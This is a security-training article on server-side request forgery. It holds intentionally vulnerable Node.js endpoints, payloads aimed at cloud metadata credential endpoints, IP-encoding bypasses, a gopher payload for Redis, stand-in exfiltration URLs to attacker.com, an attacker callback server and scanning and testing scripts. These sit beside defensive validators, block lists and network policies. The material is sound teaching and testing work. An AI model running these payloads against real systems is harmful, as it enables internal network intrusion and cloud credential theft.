---
title: SSRF Server-Side Request Forgery
description: Understand SSRF vulnerabilities and defenses
track: security
section: web-security
difficulty: intermediate
tags:
  - SSRF
  - vulnerability
  - web security
  - defense
status: imported
origin: old/src/content/docs/security/ssrf.en.md
divergence: 0.192
issues: []
legacy:
  category: Security
  subcategory: Web Security
  order: 23
  lastUpdated: 2026-01-07
---

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows attackers to induce a server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This vulnerability can lead to unauthorized access to internal services, data leakage, remote code execution, and cloud infrastructure compromise.

## What is SSRF?

SSRF occurs when an application fetches a remote resource based on user-supplied input without properly validating the destination URL. The server becomes a proxy for the attacker, making requests on their behalf with the server's privileges and network access.

### How SSRF Works

```
+------------------+       +------------------+       +------------------+
|    Attacker      |       |   Vulnerable     |       |  Internal        |
|                  |       |   Server         |       |  Resources       |
+--------+---------+       +--------+---------+       +--------+---------+
         |                          |                          |
         | 1. Malicious Request     |                          |
         | url=http://internal/api  |                          |
         +------------------------->|                          |
         |                          |                          |
         |                          | 2. Server fetches URL    |
         |                          +------------------------->|
         |                          |                          |
         |                          |<-------------------------+
         |                          | 3. Internal response     |
         |                          |                          |
         |<-------------------------+                          |
         | 4. Data returned         |                          |
         |    to attacker           |                          |
         |                          |                          |
+--------+---------+       +--------+---------+       +--------+---------+
```

### Why SSRF is Dangerous

SSRF is particularly dangerous because:

1. **Bypasses Network Security**: The server often has access to internal networks that external attackers cannot reach directly
2. **Trusted Identity**: Requests appear to originate from a trusted internal server
3. **Access to Sensitive Services**: Can reach internal APIs, databases, and metadata services
4. **Potential for Escalation**: Often leads to further attacks like remote code execution

## Common SSRF Attack Vectors

### Basic URL Fetching Vulnerability

```javascript
// VULNERABLE: Accepting arbitrary URLs from user input
app.get('/api/fetch-url', async (req, res) => {
  const url = req.query.url;

  // Server fetches whatever URL the attacker provides
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});

// Attacker request examples:
// ?url=http://localhost:22 (port scanning)
// ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
// ?url=http://internal-api.local/admin/users (internal API access)
// ?url=file:///etc/passwd (local file read)
```

### Image/File Processing

```javascript
// VULNERABLE: Image processing with user-provided URLs
app.post('/api/profile/avatar', async (req, res) => {
  const imageUrl = req.body.imageUrl;

  // Fetching and processing image from URL
  const response = await fetch(imageUrl);
  const buffer = await response.buffer();

  // Process and save the image
  await processAndSaveImage(buffer, req.user.id);
  res.json({ success: true });
});

// Attacker can abuse this to:
// - Scan internal network ports
// - Access internal HTTP services
// - Retrieve cloud metadata
```

### Webhook Functionality

```javascript
// VULNERABLE: Webhook registration without URL validation
app.post('/api/webhooks/register', async (req, res) => {
  const { url, events } = req.body;

  // Testing webhook connectivity
  try {
    await fetch(url, {
      method: 'POST',
      body: JSON.stringify({ test: true })
    });
  } catch (error) {
    return res.status(400).json({ error: 'Webhook URL not reachable' });
  }

  // Store webhook - attacker can register internal URLs
  await db.webhooks.create({ url, events, userId: req.user.id });
  res.json({ success: true });
});
```

### PDF/Document Generation

```javascript
// VULNERABLE: HTML to PDF conversion with external resources
app.post('/api/generate-pdf', async (req, res) => {
  const { htmlContent } = req.body;

  // Attacker can embed: <img src="http://internal-server/secret">
  // or use CSS: @import url('http://169.254.169.254/...')

  const pdf = await htmlToPdf(htmlContent, {
    // This option allows fetching external resources
    waitForNetwork: true
  });

  res.type('application/pdf').send(pdf);
});
```

### URL Redirect Following

```javascript
// VULNERABLE: Following redirects without validation
app.get('/api/proxy', async (req, res) => {
  const url = req.query.url;

  // Initial URL might be valid, but redirect to internal resource
  // Example: https://attacker.com/redirect -> http://localhost:6379
  const response = await fetch(url, {
    redirect: 'follow' // Follows redirects automatically
  });

  res.send(await response.text());
});
```

## Blind SSRF

Blind SSRF occurs when the server makes a request to an attacker-controlled or internal URL, but the response is not returned to the attacker. Detection and exploitation require out-of-band techniques.

### Understanding Blind SSRF

```javascript
// VULNERABLE: No response returned but request is made
app.post('/api/validate-url', async (req, res) => {
  const { url } = req.body;

  try {
    // Request is made but response is not exposed to user
    await fetch(url, { method: 'HEAD', timeout: 5000 });
    res.json({ valid: true });
  } catch (error) {
    res.json({ valid: false });
  }
});

// Attacker cannot see the response, but can:
// 1. Infer information from response time
// 2. Use out-of-band channels to exfiltrate data
// 3. Trigger actions on internal services
```

### Blind SSRF Detection Techniques

```javascript
// Detection via timing analysis
async function detectInternalServices(vulnerableEndpoint) {
  const targets = [
    'http://127.0.0.1:22',     // SSH
    'http://127.0.0.1:80',     // HTTP
    'http://127.0.0.1:443',    // HTTPS
    'http://127.0.0.1:3306',   // MySQL
    'http://127.0.0.1:5432',   // PostgreSQL
    'http://127.0.0.1:6379',   // Redis
    'http://127.0.0.1:27017',  // MongoDB
    'http://127.0.0.1:9200',   // Elasticsearch
  ];

  const results = [];

  for (const target of targets) {
    const start = Date.now();

    try {
      await fetch(`${vulnerableEndpoint}?url=${encodeURIComponent(target)}`);
    } catch (e) {}

    const elapsed = Date.now() - start;
    results.push({ target, elapsed });
  }

  // Open ports typically respond faster than closed ones
  return results.sort((a, b) => a.elapsed - b.elapsed);
}
```

### Out-of-Band Data Exfiltration

```javascript
// Attacker's approach for blind SSRF data extraction
// Using DNS exfiltration technique

// If the vulnerable server can make requests to:
// http://$(cat /etc/hostname).attacker-controlled-dns.com

// Or via HTTP to attacker's server:
// http://attacker.com/collect?data=EXFILTRATED_DATA

// Attacker's collection server
const http = require('http');

http.createServer((req, res) => {
  // Log all incoming requests
  console.log('Received request:');
  console.log('  Path:', req.url);
  console.log('  Headers:', req.headers);
  console.log('  Source IP:', req.socket.remoteAddress);

  // This confirms blind SSRF and captures exfiltrated data
  res.end('ok');
}).listen(80);
```

## Cloud Metadata Exploitation

Cloud metadata services are prime targets for SSRF attacks because they expose sensitive instance information without authentication.

### AWS Instance Metadata Service (IMDS)

```javascript
// SSRF attack targeting AWS metadata
const metadataEndpoints = [
  // IMDSv1 - No authentication required
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://169.254.169.254/latest/user-data',

  // Getting IAM role name first
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]',

  // Alternative IP representations (bypass attempts)
  'http://2852039166/',          // Decimal IP
  'http://0xa9fea9fe/',          // Hex IP
  'http://[::ffff:169.254.169.254]/', // IPv6
  'http://169.254.169.254.nip.io/',   // DNS rebinding
];

// Response contains temporary AWS credentials:
// {
//   "AccessKeyId": "ASIA...",
//   "SecretAccessKey": "...",
//   "Token": "...",
//   "Expiration": "2024-01-15T12:00:00Z"
// }
```

### IMDSv2 and Its Protections

```javascript
// AWS IMDSv2 requires a token obtained via PUT request
// This is harder to exploit via SSRF but not impossible

// Step 1: Get token (requires PUT with specific header)
const tokenResponse = await fetch(
  'http://169.254.169.254/latest/api/token',
  {
    method: 'PUT',
    headers: {
      'X-aws-ec2-metadata-token-ttl-seconds': '21600'
    }
  }
);
const token = await tokenResponse.text();

// Step 2: Use token to access metadata
const metadataResponse = await fetch(
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  {
    headers: {
      'X-aws-ec2-metadata-token': token
    }
  }
);

// Many SSRF vulnerabilities don't allow custom headers
// But some do (e.g., full HTTP request control)
```

### GCP Metadata Service

```javascript
// GCP metadata requires Metadata-Flavor header
const gcpEndpoints = [
  // Instance metadata
  'http://metadata.google.internal/computeMetadata/v1/instance/',

  // Service account token (most valuable)
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',

  // Project information
  'http://metadata.google.internal/computeMetadata/v1/project/',

  // Service account email
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
];

// Requires header: Metadata-Flavor: Google
// Some SSRF scenarios allow setting this header
```

### Azure Instance Metadata

```javascript
// Azure IMDS endpoints
const azureEndpoints = [
  // Instance metadata
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01',

  // Access token for managed identity
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',

  // Subscription and resource information
  'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
];

// Requires header: Metadata: true
```

### Kubernetes Metadata and Service Account Tokens

```javascript
// Kubernetes internal service discovery via SSRF
const k8sEndpoints = [
  // Kubernetes API server
  'https://kubernetes.default.svc/',

  // Service account token (mounted in pods by default)
  // Path: /var/run/secrets/kubernetes.io/serviceaccount/token

  // Kubelet API (if accessible)
  'https://localhost:10250/pods',
  'https://localhost:10255/pods',

  // etcd (if accessible - contains all cluster data)
  'http://localhost:2379/v2/keys/',
];

// Internal Kubernetes DNS allows service discovery:
// http://[service-name].[namespace].svc.cluster.local
```

## SSRF Prevention Techniques

### URL Validation and Parsing

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

class URLValidator {
  constructor(options = {}) {
    this.allowedProtocols = options.protocols || ['https:'];
    this.allowedPorts = options.ports || [443, 80];
    this.allowedDomains = options.domains || [];
    this.blockedDomains = options.blockedDomains || [
      'localhost',
      '127.0.0.1',
      '0.0.0.0',
      '::1',
      'metadata.google.internal',
      '169.254.169.254'
    ];
  }

  async validate(userUrl) {
    // Step 1: Parse URL
    let parsed;
    try {
      parsed = new URL(userUrl);
    } catch (e) {
      throw new Error('Invalid URL format');
    }

    // Step 2: Protocol validation
    if (!this.allowedProtocols.includes(parsed.protocol)) {
      throw new Error(`Protocol ${parsed.protocol} not allowed`);
    }

    // Step 3: Port validation
    const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
    if (!this.allowedPorts.includes(parseInt(port))) {
      throw new Error(`Port ${port} not allowed`);
    }

    // Step 4: Hostname validation
    const hostname = parsed.hostname.toLowerCase();

    // Check against blocked domains
    for (const blocked of this.blockedDomains) {
      if (hostname === blocked || hostname.endsWith('.' + blocked)) {
        throw new Error('Domain not allowed');
      }
    }

    // Step 5: Whitelist check (if configured)
    if (this.allowedDomains.length > 0) {
      const isAllowed = this.allowedDomains.some(domain =>
        hostname === domain || hostname.endsWith('.' + domain)
      );
      if (!isAllowed) {
        throw new Error('Domain not in allowlist');
      }
    }

    // Step 6: Prevent URL with credentials
    if (parsed.username || parsed.password) {
      throw new Error('URLs with credentials not allowed');
    }

    return parsed;
  }
}

// Usage
const validator = new URLValidator({
  protocols: ['https:'],
  domains: ['api.trusted-service.com', 'cdn.example.com']
});

app.get('/api/fetch', async (req, res) => {
  try {
    const validated = await validator.validate(req.query.url);
    const response = await fetch(validated.href);
    res.send(await response.text());
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

### IP Address Validation

```javascript
const ipaddr = require('ipaddr.js');

class IPValidator {
  constructor() {
    // Private and special-use IP ranges to block
    this.blockedRanges = [
      // IPv4
      ['0.0.0.0', 8],        // Current network
      ['10.0.0.0', 8],       // Private network (Class A)
      ['100.64.0.0', 10],    // Carrier-grade NAT
      ['127.0.0.0', 8],      // Loopback
      ['169.254.0.0', 16],   // Link-local / AWS metadata
      ['172.16.0.0', 12],    // Private network (Class B)
      ['192.0.0.0', 24],     // IETF Protocol Assignments
      ['192.0.2.0', 24],     // TEST-NET-1
      ['192.88.99.0', 24],   // 6to4 Relay Anycast
      ['192.168.0.0', 16],   // Private network (Class C)
      ['198.18.0.0', 15],    // Network benchmarking
      ['198.51.100.0', 24],  // TEST-NET-2
      ['203.0.113.0', 24],   // TEST-NET-3
      ['224.0.0.0', 4],      // Multicast
      ['240.0.0.0', 4],      // Reserved for future use
      ['255.255.255.255', 32], // Broadcast

      // IPv6
      ['::1', 128],          // Loopback
      ['::ffff:0:0', 96],    // IPv4-mapped addresses
      ['64:ff9b::', 96],     // IPv4/IPv6 translation
      ['100::', 64],         // Discard prefix
      ['2001::', 32],        // Teredo
      ['2001:10::', 28],     // ORCHID
      ['2001:20::', 28],     // ORCHIDv2
      ['2001:db8::', 32],    // Documentation
      ['fc00::', 7],         // Unique local address
      ['fe80::', 10],        // Link-local
      ['ff00::', 8],         // Multicast
    ];
  }

  isBlocked(ipString) {
    try {
      const ip = ipaddr.parse(ipString);

      for (const [subnet, prefixLength] of this.blockedRanges) {
        try {
          const range = ipaddr.parse(subnet);

          // Check if IP types match
          if (ip.kind() !== range.kind()) {
            continue;
          }

          // Check if IP falls within the blocked range
          if (ip.match(range, prefixLength)) {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      return false;
    } catch (e) {
      // If we can't parse it, block it to be safe
      return true;
    }
  }

  isPublicIP(ipString) {
    return !this.isBlocked(ipString);
  }
}

// Usage
const ipValidator = new IPValidator();

async function validateResolvedIP(hostname) {
  const addresses = await dns.resolve4(hostname).catch(() => []);
  const addresses6 = await dns.resolve6(hostname).catch(() => []);
  const allAddresses = [...addresses, ...addresses6];

  if (allAddresses.length === 0) {
    throw new Error('Could not resolve hostname');
  }

  for (const addr of allAddresses) {
    if (ipValidator.isBlocked(addr)) {
      throw new Error(`Resolved IP ${addr} is not allowed`);
    }
  }

  return allAddresses;
}
```

### DNS Rebinding Prevention

```javascript
const dns = require('dns').promises;

class SSRFSafeFetcher {
  constructor(options = {}) {
    this.urlValidator = new URLValidator(options);
    this.ipValidator = new IPValidator();
    this.timeout = options.timeout || 5000;
  }

  async safeFetch(userUrl, fetchOptions = {}) {
    // Step 1: Validate URL structure
    const parsed = await this.urlValidator.validate(userUrl);

    // Step 2: Resolve DNS and validate IPs
    const resolvedIPs = await this.validateAndResolveDNS(parsed.hostname);

    // Step 3: Make request with IP pinning
    // This prevents DNS rebinding by using the resolved IP directly
    const response = await this.fetchWithIPPin(
      parsed,
      resolvedIPs[0],
      fetchOptions
    );

    return response;
  }

  async validateAndResolveDNS(hostname) {
    const addresses = await dns.resolve4(hostname).catch(() => []);
    const addresses6 = await dns.resolve6(hostname).catch(() => []);
    const allAddresses = [...addresses, ...addresses6];

    if (allAddresses.length === 0) {
      throw new Error('Could not resolve hostname');
    }

    // Validate all resolved IPs
    for (const addr of allAddresses) {
      if (this.ipValidator.isBlocked(addr)) {
        throw new Error(`Resolved IP ${addr} is blocked`);
      }
    }

    return allAddresses;
  }

  async fetchWithIPPin(parsedUrl, pinnedIP, options) {
    // Create URL with IP instead of hostname
    const ipUrl = new URL(parsedUrl.href);
    ipUrl.hostname = pinnedIP;

    // Make request with original host header
    const response = await fetch(ipUrl.href, {
      ...options,
      headers: {
        ...options.headers,
        Host: parsedUrl.host // Original hostname for virtual hosting
      },
      redirect: 'manual', // Don't auto-follow redirects
      timeout: this.timeout
    });

    // If redirect, validate the new location
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get('location');
      if (location) {
        // Recursively validate redirect destination
        return this.safeFetch(location, options);
      }
    }

    return response;
  }
}

// Usage
const fetcher = new SSRFSafeFetcher({
  protocols: ['https:'],
  domains: ['api.allowed-service.com']
});

app.get('/api/proxy', async (req, res) => {
  try {
    const response = await fetcher.safeFetch(req.query.url);
    res.send(await response.text());
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

### Allowlist-Based Approach

```javascript
class StrictURLAllowlist {
  constructor() {
    // Define exact allowed endpoints
    this.allowedEndpoints = new Map([
      ['github-api', {
        baseUrl: 'https://api.github.com',
        allowedPaths: ['/repos/', '/users/'],
        methods: ['GET']
      }],
      ['weather-api', {
        baseUrl: 'https://api.weather.com',
        allowedPaths: ['/v1/forecast'],
        methods: ['GET']
      }],
      ['image-cdn', {
        baseUrl: 'https://cdn.example.com',
        allowedPaths: ['/images/'],
        methods: ['GET']
      }]
    ]);
  }

  validateRequest(serviceName, path, method = 'GET') {
    const service = this.allowedEndpoints.get(serviceName);

    if (!service) {
      throw new Error(`Unknown service: ${serviceName}`);
    }

    // Validate method
    if (!service.methods.includes(method.toUpperCase())) {
      throw new Error(`Method ${method} not allowed for ${serviceName}`);
    }

    // Validate path
    const isPathAllowed = service.allowedPaths.some(allowedPath =>
      path.startsWith(allowedPath)
    );

    if (!isPathAllowed) {
      throw new Error(`Path not allowed for ${serviceName}`);
    }

    // Construct safe URL
    return new URL(path, service.baseUrl).href;
  }
}

// Usage - user cannot specify arbitrary URLs
const allowlist = new StrictURLAllowlist();

app.get('/api/github/:owner/:repo', async (req, res) => {
  try {
    const path = `/repos/${req.params.owner}/${req.params.repo}`;
    const safeUrl = allowlist.validateRequest('github-api', path, 'GET');

    const response = await fetch(safeUrl);
    res.json(await response.json());
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

### Network-Level Protection

```javascript
// Configure outbound firewall rules (conceptual - implement at infrastructure level)
const networkPolicy = {
  // Block outbound connections to metadata services
  egress: [
    {
      deny: true,
      destinations: ['169.254.169.254/32'],
      comment: 'Block AWS/Azure metadata service'
    },
    {
      deny: true,
      destinations: ['metadata.google.internal'],
      comment: 'Block GCP metadata service'
    },
    {
      deny: true,
      destinations: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'],
      comment: 'Block private networks'
    }
  ]
};

// In AWS, use VPC endpoints and security groups
// In GCP, use VPC firewall rules
// In Azure, use NSG and Azure Firewall

// For Kubernetes, use NetworkPolicy
const k8sNetworkPolicy = `
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata-access
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
`;
```

## Secure URL Validation

### Comprehensive URL Validator

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const punycode = require('punycode');

class SecureURLValidator {
  constructor(config = {}) {
    this.config = {
      allowedProtocols: config.protocols || ['https:'],
      allowedHosts: config.hosts || [],
      blockedHosts: config.blockedHosts || [],
      allowedPorts: config.ports || [443],
      maxRedirects: config.maxRedirects || 0,
      timeout: config.timeout || 5000,
      blockPrivateIPs: config.blockPrivateIPs !== false,
      blockMetadata: config.blockMetadata !== false
    };

    this.metadataHosts = [
      '169.254.169.254',
      'metadata.google.internal',
      'metadata',
      '169.254.170.2', // ECS task metadata
    ];
  }

  async validate(inputUrl) {
    const errors = [];

    // Step 1: Basic URL parsing
    let parsed;
    try {
      parsed = new URL(inputUrl);
    } catch (e) {
      throw new ValidationError('Invalid URL format', 'INVALID_FORMAT');
    }

    // Step 2: Protocol check
    if (!this.config.allowedProtocols.includes(parsed.protocol)) {
      throw new ValidationError(
        `Protocol '${parsed.protocol}' not allowed`,
        'INVALID_PROTOCOL'
      );
    }

    // Step 3: Decode and normalize hostname
    let hostname = parsed.hostname.toLowerCase();

    // Handle IDN/Punycode domains
    try {
      hostname = punycode.toASCII(hostname);
    } catch (e) {
      throw new ValidationError('Invalid hostname encoding', 'INVALID_HOSTNAME');
    }

    // Step 4: Check for URL encoding tricks
    if (this.hasEncodingTricks(inputUrl)) {
      throw new ValidationError('Suspicious URL encoding detected', 'ENCODING_TRICKS');
    }

    // Step 5: Blocked hosts check
    if (this.isBlockedHost(hostname)) {
      throw new ValidationError('Host is blocked', 'BLOCKED_HOST');
    }

    // Step 6: Metadata service check
    if (this.config.blockMetadata && this.isMetadataEndpoint(hostname)) {
      throw new ValidationError('Metadata endpoint access blocked', 'METADATA_BLOCKED');
    }

    // Step 7: Allowlist check (if configured)
    if (this.config.allowedHosts.length > 0 && !this.isAllowedHost(hostname)) {
      throw new ValidationError('Host not in allowlist', 'HOST_NOT_ALLOWED');
    }

    // Step 8: Port validation
    const port = parsed.port || this.getDefaultPort(parsed.protocol);
    if (!this.config.allowedPorts.includes(parseInt(port))) {
      throw new ValidationError(`Port ${port} not allowed`, 'INVALID_PORT');
    }

    // Step 9: DNS resolution and IP validation
    if (this.config.blockPrivateIPs) {
      await this.validateResolvedIPs(hostname);
    }

    // Step 10: Credentials check
    if (parsed.username || parsed.password) {
      throw new ValidationError('URLs with credentials not allowed', 'CREDENTIALS_NOT_ALLOWED');
    }

    return {
      original: inputUrl,
      normalized: parsed.href,
      hostname: hostname,
      port: parseInt(port),
      protocol: parsed.protocol,
      path: parsed.pathname,
      valid: true
    };
  }

  hasEncodingTricks(url) {
    // Check for various encoding bypass techniques
    const patterns = [
      /%00/i,           // Null byte
      /%0[aAdD]/i,      // Newline/CR
      /@/,              // Credentials separator (if not parsed correctly)
      /\\/,             // Backslash (can confuse parsers)
      /%252f/i,         // Double-encoded slash
      /0x[0-9a-f]+/i,   // Hex IP notation
    ];

    return patterns.some(pattern => pattern.test(url));
  }

  isBlockedHost(hostname) {
    const blockedPatterns = [
      /^localhost$/i,
      /^127\.\d+\.\d+\.\d+$/,
      /^0\.0\.0\.0$/,
      /^::1$/,
      /^\[::1\]$/,
      /^0+$/,                    // 0 resolves to 0.0.0.0
      /\.local$/i,               // mDNS
      /\.internal$/i,            // Internal domains
      /\.localhost$/i,
      /^kubernetes\.default/i,   // Kubernetes
    ];

    if (blockedPatterns.some(pattern => pattern.test(hostname))) {
      return true;
    }

    return this.config.blockedHosts.some(blocked =>
      hostname === blocked || hostname.endsWith('.' + blocked)
    );
  }

  isMetadataEndpoint(hostname) {
    return this.metadataHosts.some(meta =>
      hostname === meta || hostname.endsWith('.' + meta)
    );
  }

  isAllowedHost(hostname) {
    return this.config.allowedHosts.some(allowed =>
      hostname === allowed || hostname.endsWith('.' + allowed)
    );
  }

  getDefaultPort(protocol) {
    const defaults = {
      'https:': 443,
      'http:': 80,
      'ftp:': 21
    };
    return defaults[protocol] || 80;
  }

  async validateResolvedIPs(hostname) {
    const ipValidator = new IPValidator();

    try {
      const addresses = await dns.resolve4(hostname).catch(() => []);
      const addresses6 = await dns.resolve6(hostname).catch(() => []);
      const allAddresses = [...addresses, ...addresses6];

      if (allAddresses.length === 0) {
        throw new ValidationError('Could not resolve hostname', 'DNS_RESOLUTION_FAILED');
      }

      for (const addr of allAddresses) {
        if (ipValidator.isBlocked(addr)) {
          throw new ValidationError(
            `Resolved IP ${addr} is private/blocked`,
            'PRIVATE_IP'
          );
        }
      }
    } catch (error) {
      if (error instanceof ValidationError) throw error;
      throw new ValidationError('DNS resolution error', 'DNS_ERROR');
    }
  }
}

class ValidationError extends Error {
  constructor(message, code) {
    super(message);
    this.name = 'ValidationError';
    this.code = code;
  }
}

// Usage
const validator = new SecureURLValidator({
  protocols: ['https:'],
  hosts: ['api.github.com', 'api.stripe.com'],
  ports: [443],
  blockPrivateIPs: true,
  blockMetadata: true
});

app.post('/api/webhook/test', async (req, res) => {
  try {
    const result = await validator.validate(req.body.url);

    // Safe to make request
    const response = await fetch(result.normalized, {
      method: 'POST',
      body: JSON.stringify({ test: true }),
      timeout: 5000
    });

    res.json({ success: true, status: response.status });
  } catch (error) {
    if (error instanceof ValidationError) {
      res.status(400).json({
        error: error.message,
        code: error.code
      });
    } else {
      res.status(500).json({ error: 'Internal error' });
    }
  }
});
```

## Testing for SSRF Vulnerabilities

### Manual Testing Techniques

```javascript
// Test payloads for SSRF detection
const ssrfTestPayloads = [
  // Local/Internal access
  'http://127.0.0.1/',
  'http://localhost/',
  'http://0.0.0.0/',
  'http://[::1]/',

  // Alternative representations of 127.0.0.1
  'http://2130706433/',          // Decimal
  'http://0x7f000001/',          // Hex
  'http://017700000001/',        // Octal
  'http://127.1/',               // Shortened
  'http://127.0.1/',             // Another shorthand

  // Cloud metadata
  'http://169.254.169.254/',
  'http://metadata.google.internal/',
  'http://169.254.170.2/',       // AWS ECS

  // IPv6 representations
  'http://[0:0:0:0:0:0:0:1]/',
  'http://[::ffff:127.0.0.1]/',

  // DNS rebinding setup
  'http://ssrf-test.your-domain.com/',  // Configure to resolve to 127.0.0.1

  // Protocol handlers
  'file:///etc/passwd',
  'gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a',
  'dict://localhost:11211/stats',

  // Redirects (host a redirect server)
  'http://attacker.com/redirect?url=http://127.0.0.1/',
];

// Automated testing function
async function testForSSRF(endpoint, paramName) {
  const results = [];

  for (const payload of ssrfTestPayloads) {
    const startTime = Date.now();

    try {
      const response = await fetch(
        `${endpoint}?${paramName}=${encodeURIComponent(payload)}`,
        { timeout: 10000 }
      );

      const elapsed = Date.now() - startTime;
      const body = await response.text();

      results.push({
        payload,
        status: response.status,
        elapsed,
        bodyLength: body.length,
        suspicious: this.analyzeResponse(body, response)
      });
    } catch (error) {
      results.push({
        payload,
        error: error.message,
        elapsed: Date.now() - startTime
      });
    }
  }

  return results;
}
```

### Automated SSRF Testing

```python
# Python script for comprehensive SSRF testing
import requests
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

class SSRFTester:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.callback_server = None
        self.callback_received = False

    def start_callback_server(self, port=8888):
        """Start server to detect out-of-band callbacks"""
        class CallbackHandler(BaseHTTPRequestHandler):
            def do_GET(handler):
                self.callback_received = True
                handler.send_response(200)
                handler.end_headers()
                handler.wfile.write(b"OK")

            def log_message(handler, format, *args):
                print(f"[CALLBACK] {args}")

        self.callback_server = HTTPServer(('0.0.0.0', port), CallbackHandler)
        thread = threading.Thread(target=self.callback_server.serve_forever)
        thread.daemon = True
        thread.start()
        return port

    def test_basic_ssrf(self):
        """Test for basic SSRF vulnerabilities"""
        payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://[::1]:80",
            "http://169.254.169.254/",
        ]

        results = []
        for payload in payloads:
            try:
                resp = requests.get(
                    self.target_url,
                    params={self.param_name: payload},
                    timeout=5
                )
                results.append({
                    'payload': payload,
                    'status': resp.status_code,
                    'length': len(resp.content)
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})

        return results

    def test_blind_ssrf(self, callback_host):
        """Test for blind SSRF using out-of-band channel"""
        callback_url = f"http://{callback_host}:{self.callback_port}/ssrf-test"

        try:
            requests.get(
                self.target_url,
                params={self.param_name: callback_url},
                timeout=5
            )
        except:
            pass

        # Wait for callback
        import time
        time.sleep(2)

        return self.callback_received
```

## Interview Key Points

### Common SSRF Interview Questions

**Q1: What is SSRF and why is it dangerous?**

A: SSRF (Server-Side Request Forgery) is a vulnerability where an attacker can make a server-side application send HTTP requests to arbitrary destinations. It is dangerous because:
- It bypasses network perimeter security (firewall, ACLs)
- The server's identity and privileges are used for requests
- It can access internal services not exposed to the internet
- It enables cloud metadata theft, leading to full infrastructure compromise

**Q2: How do you prevent SSRF vulnerabilities?**

A: Key prevention strategies include:
1. **Allowlist approach**: Only permit requests to known, safe destinations
2. **URL validation**: Validate protocol, host, port, and path
3. **DNS resolution validation**: Check resolved IPs against blocked ranges
4. **Block private IP ranges**: Prevent access to internal networks
5. **Disable unnecessary protocols**: Only allow HTTP/HTTPS
6. **Network segmentation**: Use firewalls to block outbound access to sensitive networks
7. **Implement IMDSv2**: Require token-based access for cloud metadata

**Q3: What is blind SSRF and how is it different from regular SSRF?**

A: In blind SSRF, the server makes the request but doesn't return the response to the attacker. Detection requires:
- Out-of-band channels (attacker-controlled servers to receive callbacks)
- Timing analysis (different response times for open vs closed ports)
- Error-based inference (different error messages for different scenarios)

Blind SSRF is still dangerous as it can:
- Trigger actions on internal services
- Exfiltrate data via DNS or HTTP callbacks
- Perform port scanning

**Q4: How can SSRF be used to compromise cloud infrastructure?**

A: Cloud metadata services are primary targets:
1. **AWS**: Access `169.254.169.254` to retrieve IAM credentials
2. **GCP**: Access `metadata.google.internal` for service account tokens
3. **Azure**: Access metadata endpoint for managed identity tokens

With these credentials, attackers can:
- Access cloud storage (S3, GCS, Blob Storage)
- Modify cloud resources
- Pivot to other services
- Achieve full cloud account compromise

**Q5: What bypass techniques exist for SSRF protections?**

A: Common bypass techniques include:
- **IP encoding**: Decimal, hex, octal representations of IP addresses
- **DNS rebinding**: Making DNS resolve to internal IPs after validation
- **URL parsing inconsistencies**: Using different URL formats
- **Redirect following**: Initial URL passes validation, redirects to internal target
- **IPv6 addressing**: Using IPv6 representations of internal addresses
- **Protocol smuggling**: Using alternative protocols like gopher://

## Summary

SSRF vulnerabilities represent a critical security risk in modern web applications, particularly in cloud environments. Key takeaways for preventing SSRF include:

1. **Use allowlists over blocklists**: Explicitly define permitted destinations rather than trying to block all dangerous ones

2. **Validate at multiple layers**: URL parsing, DNS resolution, and IP validation should all be performed

3. **Prevent DNS rebinding**: Pin resolved IPs and re-validate after each DNS resolution

4. **Block cloud metadata access**: Both at application and network level

5. **Disable redirect following**: Or re-validate each redirect destination

6. **Implement defense in depth**: Combine application-level controls with network-level restrictions

7. **Use modern cloud security features**: IMDSv2 for AWS, metadata headers for GCP/Azure

8. **Regular security testing**: Include SSRF in your security testing program

SSRF protection requires a comprehensive approach combining input validation, network controls, and cloud-specific security measures. As applications increasingly interact with external services and cloud infrastructure, robust SSRF prevention becomes essential for maintaining security.
